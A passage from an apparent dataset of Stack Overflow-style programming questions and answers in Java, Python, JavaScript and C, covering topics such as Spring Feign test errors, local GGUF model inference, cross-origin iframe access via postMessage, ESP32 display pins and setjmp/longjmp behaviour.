However, I'm facing the exception below when I try an @Autowired ReviewProvider:
Exception (cause)
Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'org.springframework.cloud.netflix.feign.FeignContext' available
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:353)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:351)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:340)
    at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1093)
    at org.springframework.cloud.netflix.feign.FeignClientFactoryBean.getObject(FeignClientFactoryBean.java:155)
    at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:168)

ReviewProvider.java
@FeignClient(""http://metadata-reviews"")
public interface ReviewProvider {

    @RequestMapping(path = ""sessions"", method = POST)
    ReviewSessionDTO createSession();

}

ReviewProvider.java
@RunWith(SpringRunner.class)
@ActiveProfiles(INTEGRATION)
@ContextConfiguration(classes = AppEntry.class)
@AutoConfigureTestDatabase(replace = Replace.NONE)
@DataJpaTest
public class ReviewProviderTest {

    @Autowired
    private ReviewProvider provider;
    private Class<? extends ReviewProvider> providerClass;

    @Before
    public void setup() {
        providerClass = provider.getClass();
    }

    @Test
    public void classAnnotations() {
        assertTrue(providerClass.isAnnotationPresent(FeignClient.class));
        assertEquals(""http://metadata-reviews"", providerClass.getAnnotation(FeignClient.class).value());
    }

    @Test
    public void createSession() throws Exception {
        final Method method = providerClass.getDeclaredMethod(""createSession"");
        assertTrue(method.isAnnotationPresent(RequestMapping.class));

        final RequestMapping mapping = method.getAnnotation(RequestMapping.class);
        assertEquals(""sessions"", mapping.path());
        assertEquals(0, method.getParameters().toString());
    }
}

","Seems like there is not anything out there yet about the solution to this stuff...
Here is what I did to solve this:

Add this annotation to your test class:
@ImportAutoConfiguration({RibbonAutoConfiguration.class, FeignRibbonClientAutoConfiguration.class, FeignAutoConfiguration.class})


Try it, if it does not work, you might need the @EnableFeignClients annotation on your main program config
",java
how to run any quantized gguf model on cpu for local inference,"In ctransformers library, I can only load around a dozen supported models. How can I run local inference on CPU (not just on GPU) from any open-source LLM quantized in the GGUF format (e.g. Llama 3, Mistral, Zephyr, i.e. ones unsupported in ctransformers)?
","llama-cpp-python is my personal choice, because it is easy to use and it is usually one of the first to support quantized versions of new models. To install it for CPU, just run pip install llama-cpp-python. Compiling for GPU is a little more involved, so I'll refrain from posting those instructions here since you asked specifically about CPU inference. I also recommend installing huggingface_hub (pip install huggingface_hub) to easily download models.
Once you have both llama-cpp-python and huggingface_hub installed, you can download and use a model (e.g. mixtral-8x7b-instruct-v0.1-gguf) like so:
## Imports
from huggingface_hub import hf_hub_download
from llama_cpp import Llama

## Download the GGUF model
model_name = ""TheBloke/Mixtral-8x7B-Instruct-v0.1-GGUF""
model_file = ""mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf"" # this is the specific model file we'll use in this example. It's a 4-bit quant, but other levels of quantization are available in the model repo if preferred
model_path = hf_hub_download(model_name, filename=model_file)

## Instantiate model from downloaded file
llm = Llama(
    model_path=model_path,
    n_ctx=16000,  # Context length to use
    n_threads=32,            # Number of CPU threads to use
    n_gpu_layers=0        # Number of model layers to offload to GPU
)

## Generation kwargs
generation_kwargs = {
    ""max_tokens"":20000,
    ""stop"":[""</s>""],
    ""echo"":False, # Echo the prompt in the output
    ""top_k"":1 # This is essentially greedy decoding, since the model will always return the highest-probability token. Set this value > 1 for sampling decoding
}

## Run inference
prompt = ""The meaning of life is ""
res = llm(prompt, **generation_kwargs) # Res is a dictionary

## Unpack and the generated text from the LLM response dictionary and print it
print(res[""choices""][0][""text""])
# res is short for result

Keep in mind that mixtral is a fairly large model for most laptops and requires ~25+ GB RAM, so if you need a smaller model, try using one like llama-13b-chat-gguf (model_name=""TheBloke/Llama-2-13B-chat-GGUF""; model_file=""llama-2-13b-chat.Q4_K_M.gguf"") or mistral-7b-openorca-gguf (model_name=""TheBloke/Mistral-7B-OpenOrca-GGUF""; model_file=""mistral-7b-openorca.Q4_K_M.gguf"").
",python
does preventdefault in keydown event prevent a following keypress event,"I have a simple html page with a webgl canvas and javascript attached. In the script i listen to 'keydown', 'keypress' and 'keyup' events of the canvas. Inside the eventhandlers i log to debug when the events are triggered. If i call preventDefault() on the event object in the 'keydown' handler i don't get 'keypress' events anymore and wonder if this is intended behavior? So if i press for example a character key like 'a', the keydown and keyup events are fired, but keypress is only called if i preventDefault() is not called in the keydown event handler.
I tested this on windows, firefox and chrome so far. 
index.html:
<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""utf-8"">
    <title>Main</title>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui"" />
    <meta name=""format-detection"" content=""telephone=no"" />
    <meta name=""apple-mobile-web-app-capable"" content=""yes"" />
    <meta name=""mobile-web-app-capable"" content=""yes"" />
    <style>
        body,html { margin:0; padding:0; background-color:black; width:100%; height:100%; }
        canvas#webgl { width:100%; height:100%; }
    </style>
</head>
<body>
    <canvas id=""webgl"" tabindex=""0""></canvas>
    <script type=""text/javascript"" src=""test_canvaskeypress.js""></script>
</body>
</html>

test_canvaskeypress.js:

var canvas = document.getElementById(""webgl""); 
canvas.addEventListener('keydown',this.onKeyDown,false);
canvas.addEventListener('keyup',this.onKeyUp,false);
canvas.addEventListener('keypress',this.onKeyPress,false);


function onKeyDown(e) {
    console.log('keyup: '+e.keyCode); 
    e.preventDefault();//prevents the keypress event, is this intended behavior?
    e.stopPropagation();

}
function onKeyUp(e) {
    console.log('keydown: '+e.keyCode); 
    e.preventDefault();
    e.stopPropagation();
}
function onKeyPress(e) {
    console.log('keypress: '+e.key); 
    e.preventDefault();
    e.stopPropagation();
}

I don't know what to expect, because the docs for preventDefault are not very informative, but i think a keypress event should appear nonetheless preventDefault is called in onKeyDown(), because the key up event also is fired.
","From the most recent W3C Working Draft (https://www.w3.org/TR/uievents/#keydown) we can see that one of the keydown default actions is the keypress event (among others)! So, when you do a preventDefault on the keydown event, you are actually preventing the event default actions, and in this case, one of those actions is the keypress event.
",javascript
can39t change row text in docx file once row is added to table,"I have the problem with the following code:
XWPFTable table = <get table somehow>;
CTRow firstRow = table.getRow(0).getCtRow();

for (int i = 0; i < data.getRowCount(); i++) {
    CTRow ctRow = (CTRow) firstRow.copy();
    XWPFTableRow row = new XWPFTableRow(ctRow, table);
    XWPFRun[] cellRuns = row.getTableCells()
            .stream()
            .map(c -> c.getParagraphs().get(0))
            .map(p -> p.getRuns().isEmpty() ? p.createRun() : p.getRuns().get(0))
            .toArray(XWPFRun[]::new);
    for (int j = 0; j < cellRuns.length; j++) {
        cellRuns[j].setText(data.getValueAt(i, j).toString(), 0);
    }
    table.addRow(row);
}


table.getRow(1).getTableCells()
.get(0).getParagraphs()
.get(0).getRuns()
.get(0).setText(""FooBar"", 0); //change text in some added row

This code is copying the first row of the table several times and then copying values from data. Works perfectly fine (except text style) except the last operator, which was supposed to change the text in some added table row. Also, the ""FooBar"" string doesn't even appear in document.xml of created WORD document. I failed to see any clues from debug, because it seems, that table.addRow(row); operator just copies row pointer to it's internal list of rows. Also, I didn't have problems with altering already existing rows. So do you have any ideas why this could happen?
","To reproducing the problem do having a source.docx having a first table having at least two rows.
Then do running following code:
import java.io.FileInputStream;
import java.io.FileOutputStream;
import org.apache.poi.xwpf.usermodel.*;

import org.openxmlformats.schemas.wordprocessingml.x2006.main.CTRow;

public class WordInsertTableRow {

 static XWPFTableRow insertNewTableRow(XWPFTableRow sourceTableRow, int pos) throws Exception {
  XWPFTable table = sourceTableRow.getTable();
  CTRow newCTRrow = CTRow.Factory.parse(sourceTableRow.getCtRow().newInputStream());
  XWPFTableRow tableRow = new XWPFTableRow(newCTRrow, table);
  table.addRow(tableRow, pos);
  return tableRow;
 }

 static void commitTableRows(XWPFTable table) {
  int rowNr = 0;
  for (XWPFTableRow tableRow : table.getRows()) {
   table.getCTTbl().setTrArray(rowNr++, tableRow.getCtRow());
  }
 }

 public static void main(String[] args) throws Exception {

  XWPFDocument doc = new XWPFDocument(new FileInputStream(""source.docx""));
  boolean weMustCommitTableRows = false;

  XWPFTable table = doc.getTableArray(0);

  // insert new row, which is a copy of row 2, as new row 3:
  XWPFTableRow sourceTableRow = table.getRow(1);
  XWPFTableRow newRow3 = insertNewTableRow(sourceTableRow, 2);

  // now changing something in that new row:
  int i = 1;
  for (XWPFTableCell cell : newRow3.getTableCells()) {
   for (XWPFParagraph paragraph : cell.getParagraphs()) {
    for (XWPFRun run : paragraph.getRuns()) {
     run.setText(""New row 3 run "" + i++, 0);
    }
   }
  }
System.out.println(newRow3.getCtRow()); // was changed
System.out.println(table.getRow(2).getCtRow()); // even this is changed
System.out.println(table.getCTTbl().getTrArray(2)); // but this was not changed, why not?
  weMustCommitTableRows = true;

  if (weMustCommitTableRows) commitTableRows(table); // now it is changed

  FileOutputStream out = new FileOutputStream(""result.docx"");
  doc.write(out);
  out.close();
  doc.close();

 }
}

This code creates a copy of second row and inserts it as third row in the table. Then it does changing something in that new third row.
The issue ist, that the changings do appearing in low level CTRow of the row itself but do not appearing in low Level CTTbl of the table. For me this is not logically and I cannot get the reason of that. It looks as if the new CTRow elements are not part of the CTTbl at all. But they were added to it using ctTbl.setTrArray in XWPFTable.addRow. So I suspect there is something wrong with setTrArray in org.openxmlformats.schemas.wordprocessingml.x2006.main.CTTbl. It seems updating the XML correctly but losing the object relations in the array  (or list) of CTRows in CTTbl. But this is very hard to determining because of the kind of programming the org.openxmlformats.schemas classes. At least I was not able to do so. Maybe another of the professional and enthusiast programmers here may be able?
I am using the same approach for inserting rows having tthe same styling as a given source row. But after I have done this, I am setting boolean weMustCommitTableRows = true; and then I am doing if (weMustCommitTableRows) commitTableRows(table); before writing out the document. Then all changings will be committed.
",java
securityerror blocked a frame with origin from accessing a crossorigin frame,"I am loading an <iframe> in my HTML page and trying to access the elements within it using JavaScript, but when I try to execute my code, I get the following error:

SecurityError: Blocked a frame with origin ""http://www.example.com"" from accessing a cross-origin frame.

How can I access the elements in the frame?
I am using this code for testing, but in vain:
$(document).ready(function() {
    var iframeWindow = document.getElementById(""my-iframe-id"").contentWindow;

    iframeWindow.addEventListener(""load"", function() {
        var doc = iframe.contentDocument || iframe.contentWindow.document;
        var target = doc.getElementById(""my-target-id"");

        target.innerHTML = ""Found it!"";
    });
});

","Same-origin policy
You can't access an <iframe> with different origin using JavaScript, it would be a huge security flaw if you could do it. For the same-origin policy browsers block scripts trying to access a frame with a different origin.
Origin is considered different if at least one of the following parts of the address isn't maintained:
protocol://hostname:port/...
Protocol, hostname and port must be the same of your domain if you want to access a frame.
NOTE: though mostly unused nowadays, Internet Explorer is known to not strictly follow this rule, see here for details.
Examples
Here's what would happen trying to access the following URLs from http://www.example.com/home/index.html
URL                                             RESULT
http://www.example.com/home/other.html       -> Success
http://www.example.com/dir/inner/another.php -> Success
http://www.example.com:80                    -> Success (default port for HTTP)
http://www.example.com:2251                  -> Failure: different port
http://data.example.com/dir/other.html       -> Failure: different hostname
https://www.example.com/home/index.html:80   -> Failure: different protocol
ftp://www.example.com:21                     -> Failure: different protocol & port
https://google.com/search?q=james+bond       -> Failure: different protocol, port & hostname

Workaround
Even though same-origin policy blocks scripts from accessing the content of sites with a different origin, if you own both the pages, you can work around this problem using window.postMessage and its relative message event to send messages between the two pages, like this:

In your main page:
const frame = document.getElementById('your-frame-id');
frame.contentWindow.postMessage(/*any variable or object here*/, 'https://your-second-site.example');

The second argument to postMessage() can be '*' to indicate no preference about the origin of the destination. A target origin should always be provided when possible, to avoid disclosing the data you send to any other site.

In your <iframe> (contained in the main page):
window.addEventListener('message', event => {
    // IMPORTANT: check the origin of the data!
    if (event.origin === 'https://your-first-site.example') {
        // The data was sent from your site.
        // Data sent with postMessage is stored in event.data:
        console.log(event.data);
    } else {
        // The data was NOT sent from your site!
        // Be careful! Do not use it. This else branch is
        // here just for clarity, you usually shouldn't need it.
        return;
    }
});



This method can be applied in both directions, creating a listener in the main page too, and receiving responses from the frame. The same logic can also be implemented in pop-ups and basically any new window generated by the main page (e.g. using window.open()) as well, without any difference.
Disabling same-origin policy in your browser
There already are some good answers about this topic (I just found them googling), so, for the browsers where this is possible, I'll link the relative answer. However, please remember that disabling the same-origin policy will only affect your browser. Also, running a browser with same-origin security settings disabled grants any website access to cross-origin resources, so it's very unsafe and should NEVER be done if you do not know exactly what you are doing (e.g. development purposes).

Google Chrome
Mozilla Firefox
Safari
Opera: same as Chrome
Microsoft Edge: same as Chrome
Brave: same as Chrome
Microsoft Edge (old non-Chromium version): not possible
Microsoft Internet Explorer

",javascript
difference between char  and lpstr in windows,"I apologise if it is a basic or silly question. What is the difference between char* and LPSTR. where the sizeof both gives 4 bytes in my compiler. Can someone explain me in detail. thanks.. 
","LPSTR is a Windows type, meant to be the same regardless of what platform you were compiling on. It's a long pointer to a string.
Back in the days of segmented architecture (the old 64K segments, not the newer selector-based segmented memory), where you had tiny, small, medium, large and huge memory models, it was important that the Windows type was always the same, regardless of what type of pointer char * was.
So, if you complied with different compilers where the underlying types were different, the windows.h header file would define LPSTR to compensate for that.
For example, Borland C may have had a sixteen-bit char * and LPSTR may have had to be defined as far char * for it. In a compiler where char * was already a long/far pointer, LPSTR would have just used that instead.
Nowadays, with 32+ bit flat models, there is probably no real need for such shenanigans, though it may still happen with things like thunking between 64-bit and 32-bit code. Still, the types defined back then are still with us and still very much in use.
",c
java library for java to edi conversion,"I am looking for a Java library that does Java to EDI conversion - 
more specifically an EDI 835 format used in Healthcare.
Although a lot of libraries promise Java to EDI conversion, there is no
documentation or code samples available for the same on their sites.
Here is a list of libraries I have tried so far with no luck:
    1. EdiReader(EdiWriter is commercial and does not have a trial download).
    2. Smooks(No trial download and documentation does not mention Java to EDI conversion).
    3. Open Business Objects - OBOE from americancoders.com(Has a trial download but Java to    EDI not mentioned).
    4. Oakland data transformer(This doesn't even let me download the library and docs).
Does anyone know other solutions that might be helpful ?
I am open to any commercial solution too.
Thanks!
","Trial download for Smooks?! You don't need a license. There's also good documentation.
Check it out:

http://www.smooks.org/
https://github.com/smooks/smooks/

IMHO I would go with Smooks if you want no commercial solution.
",java
esp wroom32 st7789 display stops working after connecting to wifi,"In my project I use an ESP WROOM32 with a 240x280 ST7789 display connected as following:
SCL: G18
SDA: G23
RES: G4
DC:  G2
CS:  G5
I initialize it like this:
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <SPI.h>
#include <WiFi.h>
#include <HTTPClient.h>
#include <string.h>

#define TFT_CS     5
#define TFT_RST    4
#define TFT_DC     2

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_RST);

void setup() {
    tft.init(240, 280);
}

These are the functions I use to print text or clear it. Using tft.fillScreen(ST77XX_BLACK) takes way longer than printing the same text in black again hence I dont use it
void printText(String text, int cx, int cy, bool accent) {
    tft.setTextSize(2);
    tft.setTextWrap(true);
    tft.setTextColor((accent) ? tft.color565(0, 190, 255) : tft.color565(255, 255, 255));

    for (int i = 0; i < ceil((float)strlen(text.c_str()) / (float)maxCharsPerLine); i++) {
        tft.setCursor(cx, i * 20 + cy);
        char tmp[15];
        strncpy(tmp, text.c_str() + i * 14, 14);
        tmp[14] = '\0';
        tft.print(tmp);
    }
}


void clearText(String text, int cx, int cy) {
    tft.setCursor(cx, cy);
    tft.setTextSize(2);
    tft.setTextWrap(true);
    tft.setTextColor(tft.color565(0, 0, 0));

    for (int i = 0; i < ceil((float)strlen(text.c_str()) / (float)maxCharsPerLine); i++) {
        tft.setCursor(cx, i * 20 + cy);
        char tmp[maxCharsPerLine + 1];
        strncpy(tmp, text.c_str() + i * maxCharsPerLine, maxCharsPerLine);
        tmp[maxCharsPerLine] = '\0';
        tft.print(tmp);
    }
}

I don´t think they are causing the problem though. I started the project by doing all the graphics stuff and now I want to request data from a server, but the second I connect to the WiFi the display stops working. This is the function I use to connect to the WiFi:
void connect() {
    String ssid = preferences.getString(""ssid"");
    String pwd = preferences.getString(""password"");

    WiFi.begin(ssid, pwd);
}

After pushing a button the function gets called, the text on the display gets cleared and this code get executed by the loop() function:
printText(""Connecting to"", 20, 40, false);
Serial.println(WiFi.status());

The status gets printed to the serial monitor, but the display just freezes. The status changes to connected after a few seconds, but the old text doesn´t get cleared and the new text doesn´t get printed. There are no errors printed to the serial monitor. The weird thing is that commenting WiFi.begin(ssid, pwd); out removes the bug. The code seems to work, but connecting to a WiFi makes the display freeze.
What causes the error? I thought, maybe the WiFi.h library uses a pin that I use for the display?
EDIT
This is a small program which reproduces the error:
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <SPI.h>
#include <string.h>
#include <WiFi.h>

#define TFT_CS           5
#define TFT_RST          4
#define TFT_DC           2

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_RST);

bool b = false;
int i = 0;

void setup() {
    Serial.begin(115200);

    tft.init(240, 280);
    tft.setRotation(2);
    tft.fillScreen(ST77XX_BLACK);
    tft.setTextSize(2);
}

void loop() {
    i++;
    if (i == 10) WiFi.begin(""ssid"", ""password"");
    Serial.println(WiFi.status());

    b = !b;
    tft.setTextColor((b) ? tft.color565(255, 255, 255) : tft.color565(255, 0, 255));
    tft.setCursor(20, 80);
    tft.print(""Hello World"");

    delay(500);
}

","The WiFi seems to use the ADC2. Answers on other websites state, that that doesn´t matter, if your not using the pins that the ADC2 uses as an ADC channel. That turns out to be wrong.
Pin 2 and 4, which in this case were used as TFT_DC and TFT_RST, are channels of ADC2. Changing the pins to 32 and 33 does the job:
#define TFT_CS           5
#define TFT_RST         32
#define TFT_DC          33

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_RST);

",c
python version 39 does not support match statements,"I installed Python on a new computer and unfortunately I get an error message from a code that I had been using for quite some time. It is about the match statement. Here is the code:
import os

def save(df, filepath):
    dir, filename = os.path.split(filepath)
    os.makedirs(dir, exist_ok=True)
    _, ext = os.path.splitext(filename)
    match ext:
        case "".pkl"":
            df.to_pickle(filepath)
        case "".csv"":
            df.to_csv(filepath)
        case _:
            raise NotImplementedError(f""Saving as {ext}-files not implemented."")

Now my question is, how can I tackle the problem of ""Python version 3.9 does not support match statements""?
","Or just if and elif.
import os

def save(df, filepath):
    dir, filename = os.path.split(filepath)
    os.makedirs(dir, exist_ok=True)
    _, ext = os.path.splitext(filename)
    if ext == "".pkl"":
        df.to_pickle(filepath)
    elif ext == "".csv"":
        df.to_csv(filepath)
    else:
        raise NotImplementedError(f""Saving as {ext}-files not implemented."")

",python
multiple githubpages deployments using specific url paths,"I have a project that has an associated github-pages that lives at (say):
https://myorg.github.io/my_repo_name
I also have documentation for the python module.  My hope is to also deploy that the docs to the github-pages under a docs path like so:
https://myorg.github.io/my_repo_name/docs
For what its worth the site is built using mystmd and the docs are autogenerated with sphinx.
The directory structure has _build directory in the root for the site and an _build folder in subfolder, docs/ for the documentation (see below).
It it possible to do two separate deployments to github pages (one to the standard url and one to a subpath) to accomplish this?
Thanks!
Here is a rough directory structure:
.
├── my_module
│   ├── __init__.py
│   ├── thing1.py
│   ├── thing2.py

| ...

├── _build
│   ├── html
│   │   ├── ...
│   │   ├── 8122.thebe-core.min
│   │   ├── ...
│   │   ├── index.html
│   │   ├── intro.html
│   │   ├── ...

| ...

├── docs
│   ├── _build
│   │   ├── ...
│   │   └── html
│   │       ├── index.html
│   │       | ...

","Following @BenjaminW's advice I simply moved the Sphinx docs to a subfolder of the MyST docs.  I managed this with github actions (doing edits upon the one generated by myst).
The key was to remove the artifact uploads from the initial workflow then replace it with some linux commands for moving everything to the _site directory and uploading the _site directory as an artifact.  Namely
      - name: Copy builds to site-directory
        run: |
            mv _build/html _site
            mv docs/_build/html _site/docs
            mkdir _site/nb
            mv nb/public _site/nb/public
      - name: Upload Site Artifact
        uses: actions/upload-pages-artifact@v3
        with:
          path: ./_site

Here's the complete file:
# This file was created by editing the file created by `myst init --gh-pages`
name: MyST and Sphinx GitHub Pages Deploy
on:
  push:
    branches: [main]
env:
  # `BASE_URL` determines the website is served from, including CSS & JS assets
  # You may need to change this to `BASE_URL: ''`
  BASE_URL: /${{ github.event.repository.name }}

# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
permissions:
  contents: read
  pages: write
  id-token: write
# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
concurrency:
  group: 'pages'
  cancel-in-progress: false
jobs:
  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Pages
        uses: actions/configure-pages@v3
      - uses: actions/setup-node@v4
        with:
          node-version: 18.x
      - name: Install MyST Markdown
        run: npm install -g mystmd
      - name: Build MyST HTML Assets
        run: myst build --html
      - name: Install Sphinx and Dependencies
        run: |
          pip install sphinx sphinx-autodoc2 furo myst_parser
      - name: Sphinx Build HTML
        run: |
            (cd docs && make html)
      - name: Copy builds to site-directory
        run: |
            mv _build/html _site
            mv docs/_build/html _site/docs
            mkdir _site/nb
            mv nb/public _site/nb/public
      - name: Upload Site Artifact
        uses: actions/upload-pages-artifact@v3
        with:
          path: ./_site
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4

",python
understanding unexpected loop counter behavior with setjmplongjmp in c,"I have a piece of code that uses setjmp/longjmp for control flow between two functions. I noticed some unexpected behavior where the loop counter seems to skip values. Here's a minimal example that demonstrates the issue:
#include <stdio.h>
#include <setjmp.h>

jmp_buf routineA, routineB;

void routine_a()
{
    for (int i = 0; i < 10; ++i)
    {
        printf(""A %d\n"", i);
        if (!setjmp(routineA)) {
            if (i == 0)
              return;
            longjmp(routineB, 1);
        }
    }
}

void routine_b()
{
    for (int i = 0; i < 10; ++i)
    {
        printf(""B %d\n"", i);
        if (!setjmp(routineB))
          longjmp(routineA, 1);
    }
}

int main()
{
    routine_a();
    routine_b();
    return 0;
}

The output of this code is:
A 0
B 0
A 1
B 2
A 3
B 4
A 5
B 6
A 7
B 8
A 9

I'm confused about why the numbers are skipping. For example, when i=1 in routine_a, it jumps to routine_b, but when control returns to routine_a, the next value printed is 3, skipping 2 entirely.
I understand that longjmp breaks the normal control flow, but I don't understand:

Why exactly are values being skipped?
What happens to the loop counter when longjmp is called?
Is this behavior defined by the C standard or implementation-dependent?

I would appreciate any insights into what's happening under the hood.
I tried to ask AI(chatgpt claude), but still couldn't find the answer.
","
Is this behavior defined by the C standard or implementation-dependent?

The behavior of your program is not defined by the C standard.
C 2024 7.13.3.1 says, of the invocation of longjmp:

… The longjmp function restores the environment saved by the most recent invocation of the setjmp macro in the same invocation of the program with the corresponding jmp_buf argument. If … the function containing the invocation of the setjmp macro has terminated execution in the interim,… the behavior is undefined.

All prior C standards have similar wording. So, when a function calls setjmp and then returns, the behavior of later passing the associated jmp_buf object to longjmp is not defined by the C standard.

Why exactly are values being skipped?

Most commonly, setjmp and longjmp implementations rely on the stack to preserve program state. jmp_buf is an object of fixed size, so it is impossible in general to store all of a function’s variables in it. Primarily, jmp_buf holds processor registers and other processor state, including the value of the stack pointer. When longjmp is invoked, restoring the value of the stack pointer, along with other processor state, makes the original stack frame active again if it is still present on the stack. The stack frame contains the values of the function’s variables, unless optimization put them in processor registers.

What happens to the loop counter when longjmp is called?

What is likely happening in your specific program is:

routine_a is called. It uses stack space for i and initializes it to 0. routine_a returns.
routine_b is called. It uses the same stack space for its i and initializes it to 0. routine_b invokes longjmp, which transfers control to routine_a.
routine_a continues execution through the ++i portion of its loop, which changes the value of i (set to 0 in routine_b) to 1. It prints “1”. Then routine_a invokes longjmp, which transfers control to routine_b.
routine_b continues execution through its ++i, which changes the value of i (set to 1 in routine_a) to 2. It prints “2”. Then routine_b invokes longjmp, which transfers control to routine_a.
routine_a continues execution through its ++i, which changes i from 2 to 3. It prints “3”.
Execution continues in this pattern, with each routine incrementing the value of the shared i.

",c
div display status not changed by javascript,"A short time ago, I posted a question similar to this which had a typo causing confusion.  I apologize for that, it did not serve any of us well, and has since been deleted.  I have done my best to ensure that this code is clean and typo-free.  This code also shows the described problem.
This question better represents the problem that I have: that a div is not being shown when its display property is set to 'block'.  The reduced code is as follows:


function selectVidId(youtubeId, tableRowNbr, tableRowId, videoWidth, videoHeight) {
  const embedElement = document.getElementById('embedDiv');
  const videoElement = document.getElementById('videoDiv');

  let response = ""<div id='muteYouTubeVideoPlayer'></div> \
    <script> \
      function onYouTubeIframeAPIReady() \
        {
        var player = new YT.Player('muteYouTubeVideoPlayer', \
            { videoId : 'f5JVDUI81nk' // YouTube Video ID    \
            , width   : 480          // Player width (in px) \
            , height  : 360         // Player height (in px) \
            , playerVars: \
              { autoplay       : 0  // Auto-play the video on load       \
              , controls       : 1  // Show pause/play buttons in player \
              , showinfo       : 1  // Show the video title              \
              , modestbranding : 1  // Hide the Youtube Logo             \
              , loop           : 0  // Don't run the video in a loop     \
              , fs             : 0  // Don't hide the full screen button \
              , cc_load_policy : 0  // Hide closed captions              \
              , iv_load_policy : 3  // Hide the Video Annotations        \
              , autohide       : 0  // Hide video controls when playing  \
              } // playerVars \
            , events: {} // events \
            } \
          ) ; // new .Player \
        } // function \
      // Written by @labnol \
    </script>"";

  videoElement.style.display = 'none';
  embedElement.innerHTML = response;
  embedElement.style.display = 'block';
}
<!DOCTYPE html>
<html lang='en'>

<head>
  <title>Livestreams</title>
  <style>
  </style>
</head>
<script src=""dbg.js"">
</script>
</head>

<body>
  <div id='fullPageDiv' style='width: 100%; overflow:hidden;'>
    <div id='livestreamTable' style='width: 60%;float:left;'>
      <table border='1'>
        <thead>
          <tr>
            <th>Started</th>
            <th>Channel</th>
            <th>Songs noted</th>
            <th style='text-align:right;'>Duration</th>
            <th style='text-align:right;'>Dimensions</th>
            <th>Livestream Title</th>
          </tr>
        </thead>
        <tbody>
          <tr id='livestream_row_0'>
            <td>2021-12-04 07:15:08</td>
            <td style='text-align:left;'>Primary</td>
            <td style='text-align:right;'></td>
            <td style='text-align:right;'>1:04:54</td>
            <td style='text-align:right;' id='videoDimensions0'>1280x720*</td>
            <td><span onclick='selectVidId(""f5JVDUI81nk"", 0, ""livestream_row_0"", ""1280"", ""720"");'>Click-this-element</span></td>
          </tr>
        </tbody>
      </table>
    </div><!-- Livestream table -->
    <div id='videoDiv' style='display: none;'>
      <video id='idVideo' width=""320"" height=""240"" controls>
                <!-- <source src='replaceme.mp4' type='video/mp4'> -->
                Need top insert some video content here.
        </video>
    </div><!--videoDiv-->
    <div id='embedDiv' style='display: none;'>
      <p>Why, hello there!</p>
    </div><!-- embedDiv-->
  </div><!-- This is the ""page"" division (the whole page after the form) -->

</html>



The unfulfilled purpose of this page, is to present a list of items, and when one of those items is clicked, an associated YouTube video will be displayed in the top right.  When I run this through the Chrome debugger, each line of the javascript code is executed.  At the end, embedElement.style.display value is indeed set to 'block' but nothing from the embedDiv  shows.  (I inserted the silly ""Why hello there"" text solely because it should appear even if other things are problematic.)
Again I ask, what fundamental thing am I missing that causes this div to (apparently) not display?
What would be the correct approach to replacing the content of embedDiv in such a way that the necessary code actually is executed?
","You're replacing the div with an empty div, so there's nothing to display when you change embedDiv.style.display.
Either get rid of the assignment to emmedDiv.innerHTML, or put some text in response.


function selectVidId(youtubeId, tableRowNbr, tableRowId, videoWidth, videoHeight) {
  const embedElement = document.getElementById('embedDiv');
  const videoElement = document.getElementById('videoDiv');

  let response = ""<div id='muteYouTubeVideoPlayer'>This text will display</div>"";

  videoElement.style.display = 'none';
  embedElement.innerHTML = response;
  embedElement.style.display = 'block';
}
<!DOCTYPE html>
<html lang='en'>

<head>
  <title>Livestreams</title>
  <style>
  </style>
</head>
<script src=""dbg.js"">
</script>
</head>

<body>
  <div id='fullPageDiv' style='width: 100%; overflow:hidden;'>
    <div id='livestreamTable' style='width: 60%;float:left;'>
      <table border='1'>
        <thead>
          <tr>
            <th>Started</th>
            <th>Channel</th>
            <th>Songs noted</th>
            <th style='text-align:right;'>Duration</th>
            <th style='text-align:right;'>Dimensions</th>
            <th>Livestream Title</th>
          </tr>
        </thead>
        <tbody>
          <tr id='livestream_row_0'>
            <td>2021-12-04 07:15:08</td>
            <td style='text-align:left;'>Primary</td>
            <td style='text-align:right;'></td>
            <td style='text-align:right;'>1:04:54</td>
            <td style='text-align:right;' id='videoDimensions0'>1280x720*</td>
            <td><span onclick='selectVidId(""f5JVDUI81nk"", 0, ""livestream_row_0"", ""1280"", ""720"");'>Click-this-element</span></td>
          </tr>
        </tbody>
      </table>
    </div><!-- Livestream table -->
    <div id='videoDiv' style='display: none;'>
      <video id='idVideo' width=""320"" height=""240"" controls>
                <!-- <source src='replaceme.mp4' type='video/mp4'> -->
                Need top insert some video content here.
        </video>
    </div><!--videoDiv-->
    <div id='embedDiv' style='display: none;'>
      <p>Why, hello there!</p>
    </div><!-- embedDiv-->
  </div><!-- This is the ""page"" division (the whole page after the form) -->

</html>



",javascript
count the number of rows for each csv faster code,"I have a folder with several csv files. When I open them in notepad I can see the number of lines/rows. This works. However, this is a manual check. I wanted to automate this with the following code:
import os
import csv

with open(""number of lines check.txt"", ""w"") as a:
    for path, subdirs, files in os.walk(r'C:\Desktop\folder'):
        for filename in files:
            with open(os.path.join(path, filename), ""r"", encoding =""utf-8"") as f:
                reader = csv.reader(f, delimiter =""\t"")
                data = list(reader)
                row_count = len(data)
                f = os.path.join(path, filename)
